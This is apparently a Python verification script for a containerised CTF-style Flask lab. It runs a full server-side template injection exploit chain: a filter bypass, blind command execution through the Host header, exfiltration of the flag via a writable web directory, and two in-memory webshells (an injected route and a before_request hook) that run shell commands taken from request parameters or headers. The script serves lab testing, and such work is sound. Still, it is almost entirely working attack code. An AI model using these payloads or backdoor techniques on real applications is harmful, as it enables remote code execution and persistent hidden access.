#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""07-flask-memshell 端到端利用验证（在容器内运行）。

用法（宿主机）::

    docker exec -i ssti-flask-memshell python - < tests/verify_memshell.py

刻意**在容器内部**发起请求，以此证明整条链在「不出网」的前提下成立：
所有流量都走 127.0.0.1 环回，没有一次对外连接。

验证内容：
  1. /profile 用户名注入 —— 过滤生效 + `{% print(...) %}` 绕过
  2. /admin Host 头注入 —— 无回显确认（响应里绝不含命令输出）
  3. 写文件侧信道 —— 命令输出落到 /app/echo/，再经 HTTP 取回
  4. 路由型内存马 —— 绕过 setupmethod，直接改 url_map + view_functions
  5. Filter 型内存马 —— 直接往 before_request_funcs 追加钩子
"""

from __future__ import annotations

import sys

import requests

BASE = "http://127.0.0.1:5000"
FLAG_PATH = "/flag"

FAILS: list[str] = []
CHECKS = 0


def check(name: str, cond: bool, detail: str = "") -> None:
    global CHECKS
    CHECKS += 1
    if cond:
        print(f"  ok   {name}")
    else:
        print(f"  FAIL {name}  {detail}")
        FAILS.append(name)


def section(title: str) -> None:
    print(f"\n=== {title} ===")


def host_payload(s: requests.Session, payload: str, path: str = "/admin") -> requests.Response:
    """把 payload 放进 Host 头投递。

    Host 头里不能有空格，所以 payload 内部一律用 TAB 当空白 —— 这一点
    是**题目约束**而不是我们的取巧：HTTP 头字段值里空格会被当作分隔符。
    """
    return s.get(BASE + path, headers={"Host": payload}, timeout=15)


def main() -> int:
    s = requests.Session()

    # ---------------------------------------------------------------- 0
    section("0. 基线：/ 可访问、flag 可读（容器内）")
    r = s.get(BASE + "/", timeout=10)
    check("GET / 返回 200", r.status_code == 200, str(r.status_code))
    try:
        flag = open(FLAG_PATH, encoding="utf-8").read().strip()
        check("容器内存在 /flag", bool(flag), repr(flag))
    except OSError as exc:
        check("容器内存在 /flag", False, str(exc))
        return 1
    print(f"       flag = {flag}")

    # ---------------------------------------------------------------- 1
    section("1. /profile 用户名注入（过滤 {{ }} 引号 方括号）")

    # 1a. 被过滤的写法
    bad = "{{7*7}}"
    r = s.post(BASE + "/register", data={"username": bad}, timeout=10)
    check("`{{7*7}}` 被过滤拒绝", "含非法字符" in r.text, r.text[:120])

    # 1b. 绕过过滤
    good = "{%print(7*7)%}"
    s2 = requests.Session()
    r = s2.post(BASE + "/register", data={"username": good}, timeout=10)
    check("`{%print(7*7)%}` 注册通过", "含非法字符" not in r.text, r.text[:120])
    check("用户名注入回显 49", "49" in r.text, r.text[:200])

    # 引号也被拦
    r = s.post(BASE + "/register", data={"username": "{{'a'}}"}, timeout=10)
    check("引号被过滤", "含非法字符" in r.text or "WAF" in r.text, r.text[:120])

    # ---------------------------------------------------------------- 2
    section("2. /admin Host 头注入（无过滤 · 无回显）")

    marker = "MEMSHWorks"
    p_marker = "{%set u=cycler.__init__.__globals__.__builtins__%}{%set _=u.__import__('os').popen('echo\t" + marker + "')%}"
    r = host_payload(s, p_marker)
    check("Host 头 payload 不报错", r.status_code == 200, str(r.status_code))
    check("响应中**没有**回显命令输出", marker not in r.text, r.text[:200])
    check("响应中**没有**回显模板求值", "49" not in r.text)

    # ---------------------------------------------------------------- 3
    section("3. 写文件侧信道（无回显 + 不出网时的带外）")

    p_file = (
        "{%set u=cycler.__init__.__globals__.__builtins__%}"
        "{%set _=u.__import__('os').popen('cat<" + FLAG_PATH + ">/app/echo/exfil.txt')%}"
    )
    host_payload(s, p_file)
    r = s.get(BASE + "/echo/exfil.txt", timeout=10)
    check("经 /echo/ 取回命令输出", r.status_code == 200, str(r.status_code))
    check("取回内容就是 flag", r.text.strip() == flag, repr(r.text))

    # ---------------------------------------------------------------- 4
    section("4. 路由型内存马（绕过 setupmethod 保护）")

    # 关键细节：不能写 __import__('werkzeug.routing').Rule ——
    # `__import__('a.b')` 返回的是**顶层包** a，不是子模块 a.b。
    # 这里改成从 url_map 里已有的 Rule 实例反推 Rule 类，完全不依赖 import 语义。
    p_route = (
        "{%set u=cycler.__init__.__globals__.__builtins__%}"
        "{%set a=u.__import__('flask').current_app%}"
        "{%set R=a.url_map._rules.__getitem__(0).__class__%}"
        "{%set _=a.url_map.add(R('/memshell',endpoint='memshell'))%}"
        "{%set f=u.eval("
        "\"lambda:__import__('subprocess').check_output("
        "__import__('flask').request.args.get('c','id'),shell=True)\")%}"
        "{%set _=a.view_functions.__setitem__('memshell',f)%}"
    )
    r = host_payload(s, p_route)
    check("路由注入请求完成", r.status_code == 200, str(r.status_code))

    r = s.get(BASE + "/memshell", params={"c": "id"}, timeout=10)
    check("内存路由 /memshell 已生效（200）", r.status_code == 200, str(r.status_code))
    check("内存路由返回命令输出", "uid=" in r.text, repr(r.text[:200]))

    r = s.get(BASE + "/memshell", params={"c": "cat " + FLAG_PATH}, timeout=10)
    check("内存马读出 /flag", r.text.strip() == flag, repr(r.text))

    # ---------------------------------------------------------------- 5
    section("5. Filter 型内存马（before_request 钩子，对所有路径生效）")

    p_filter = (
        "{%set u=cycler.__init__.__globals__.__builtins__%}"
        "{%set a=u.__import__('flask').current_app%}"
        "{%set f=u.eval("
        "\"lambda:__import__('flask').make_response("
        "__import__('subprocess').check_output("
        "__import__('flask').request.headers.get('X-C','id'),shell=True))"
        "if __import__('flask').request.headers.get('X-M')else\tNone\")%}"
        "{%set _=a.before_request_funcs.setdefault(None,[]).append(f)%}"
    )
    r = host_payload(s, p_filter)
    check("钩子注入请求完成", r.status_code == 200, str(r.status_code))

    # 任意路径 + 触发头
    for path in ("/", "/profile", "/does-not-exist"):
        r = s.get(BASE + path, headers={"X-M": "1", "X-C": "id"}, timeout=10)
        check(f"钩子在 {path} 上劫持响应", "uid=" in r.text, repr(r.text[:120]))

    r = s.get(BASE + "/", headers={"X-M": "1", "X-C": "cat " + FLAG_PATH}, timeout=10)
    check("Filter 内存马读出 /flag", r.text.strip() == flag, repr(r.text))

    # 不带触发头时应恢复正常行为
    r = s.get(BASE + "/", timeout=10)
    check("不带触发头时站点行为正常", r.status_code == 200 and "uid=" not in r.text)

    # ---------------------------------------------------------------- 6
    section("6. 不出网自证")
    import socket

    try:
        socket.create_connection(("93.184.216.34", 80), timeout=5)
        check("对外 TCP 被阻断", False, "居然连通了")
    except Exception as exc:  # noqa: BLE001
        check("对外 TCP 被阻断", True, type(exc).__name__)
    try:
        socket.gethostbyname("example.com")
        check("DNS 被阻断", False, "居然解析成功")
    except Exception as exc:  # noqa: BLE001
        check("DNS 被阻断", True, type(exc).__name__)

    print(f"\n共 {CHECKS} 项，失败 {len(FAILS)} 项")
    if FAILS:
        print("失败：" + ", ".join(FAILS))
        return 1
    print("内存马链条全部验证通过 ✅")
    return 0


if __name__ == "__main__":
    sys.exit(main())
